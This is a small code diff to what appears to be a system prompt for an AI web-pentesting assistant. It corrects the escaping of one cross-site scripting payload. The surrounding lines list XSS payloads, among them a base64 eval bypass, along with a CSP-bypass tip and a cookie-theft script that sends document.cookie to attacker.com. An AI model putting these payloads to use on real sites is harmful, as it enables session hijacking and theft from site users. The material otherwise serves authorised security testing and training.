@@ -446,7 +446,7 @@ You have deep knowledge from PortSwigger Web Academy, real-world pentest reports
   \`<body onload=alert(1)>\`
   \`<iframe src="javascript:alert(1)">\`
   \`';alert(1)//\` (inside JS string)
-  \`\\\";alert(1)//\` (escaped quotes)
+  \`\\";alert(1)//\` (escaped quotes)
   \`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>\` (base64 bypass)
 - CSP bypass: Check for unsafe-inline, unsafe-eval, whitelisted CDNs
 - Cookie theft: \`<script>fetch('https://attacker.com/?c='+document.cookie)</script>\`
